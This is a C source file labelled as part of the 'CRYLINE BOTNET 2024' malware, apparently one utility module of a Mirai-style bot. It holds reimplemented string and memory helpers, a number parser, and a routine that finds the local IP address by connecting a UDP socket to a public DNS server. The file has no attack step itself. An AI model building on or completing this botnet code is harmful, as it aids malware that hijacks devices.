/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <arpa/inet.h>

#include "LIBRARIES.h"
#include "VALUES_DATASET.h"
#include "CUSTOM_FUNCTIONS.h"

int __ISUPPER(char C_COUNTER)
{
    return (C_COUNTER >= 'A' && C_COUNTER <= 'Z');
}

int __ISALPHA(char C_COUNTER)
{
    return ((C_COUNTER >= 'A' && C_COUNTER <= 'Z') || (C_COUNTER >= 'a' && C_COUNTER <= 'z'));
}

int __ISSPACE(char C_COUNTER)
{
    return (C_COUNTER == ' ' || C_COUNTER == '\t' || C_COUNTER == '\n' || C_COUNTER == '\12');
}

int __ISDIGIT(char C_COUNTER)
{
    return (C_COUNTER >= '0' && C_COUNTER <= '9');
}

int __STRLEN(char *_STRING)
{
    int C_COUNTER = 0;

    while (*_STRING++ != 0)
    {
        C_COUNTER++;
    }
    return C_COUNTER;
}

int __STRCOPY(char *_DESTINATION, char *_SOURCE)
{
    int GET_LINE = __STRLEN(_SOURCE);

    __MEMCPY(_DESTINATION, _SOURCE, GET_LINE + 1);

    return GET_LINE;
}

void __MEMCPY(void *_DESTINATION, void *_SOURCE, int _INPUT_STRING_LENGHT)
{
    char *DESTINATION_BLOCK = (char *)_DESTINATION;
    char *SOURCE_BLOCK = (char *)_SOURCE;

    while (_INPUT_STRING_LENGHT--)
    {
        *DESTINATION_BLOCK++ = *SOURCE_BLOCK++;
    }
}

void __ZERO(void *_BUFFER, int _INPUT_STRING_LENGHT)
{
    char *ZERO = _BUFFER;

    while (_INPUT_STRING_LENGHT--)
    {
        *ZERO++ = 0;
    }
}

int __ATOI(char *_STRING, int _BASE)
{
	unsigned long GET_ACC = 0;
	int C_COUNTER;
	unsigned long GET_CUT_OFF;
	int GET_NEG = 0, GET_ANY, GET_CUTLIM;

	do 
    {
		C_COUNTER = *_STRING++;
	} 
    while (__ISSPACE(C_COUNTER));

	if (C_COUNTER == '-') 
    {
		GET_NEG = 1;
		C_COUNTER = *_STRING++;
	} 
    else if (C_COUNTER == '+')
    {
        C_COUNTER = *_STRING++;
    }

	GET_CUT_OFF = GET_NEG ? -(unsigned long)LONG_MIN : LONG_MAX;
	GET_CUTLIM = GET_CUT_OFF % (unsigned long)_BASE;
	GET_CUT_OFF /= (unsigned long)_BASE;

	for (GET_ACC = 0, GET_ANY = 0;; C_COUNTER = *_STRING++) 
    {
		if (__ISDIGIT(C_COUNTER))
        {
            C_COUNTER -= '0';
        }
		else if (__ISALPHA(C_COUNTER))
        {
            C_COUNTER -= __ISUPPER(C_COUNTER) ? 'A' - 10 : 'a' - 10;
        }
		else
        {
            break;
        }
            
		if (C_COUNTER >= _BASE)
        {
            break;
        }

		if (GET_ANY < 0 || GET_ACC > GET_CUT_OFF || GET_ACC == GET_CUT_OFF && C_COUNTER > GET_CUTLIM)
        {
            GET_ANY = -1;
        }
		else 
        {
			GET_ANY = 1;
			GET_ACC *= _BASE;
			GET_ACC += C_COUNTER;
		}
	}

	if (GET_ANY < 0) 
    {
		GET_ACC = GET_NEG ? LONG_MIN : LONG_MAX;
	} 
    else if (GET_NEG)
    {
        GET_ACC = -GET_ACC;
    }
	return (GET_ACC);
}

__IPV4 __LOCAL_ADDR(void)
{
    int _DESCRIPTOR;
    struct sockaddr_in PACKET;
    socklen_t PACKET_LENGHT = sizeof(PACKET);

    if ((_DESCRIPTOR = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        return 0;
    }

    PACKET.sin_family = AF_INET;
    PACKET.sin_addr.s_addr = __INET_ADDR(77,88,8,8);
    PACKET.sin_port = htons(53);

    connect(_DESCRIPTOR, (struct sockaddr *)&PACKET, sizeof(struct sockaddr_in));

    getsockname(_DESCRIPTOR, (struct sockaddr *)&PACKET, &PACKET_LENGHT);

    close(_DESCRIPTOR);

    return PACKET.sin_addr.s_addr;
}
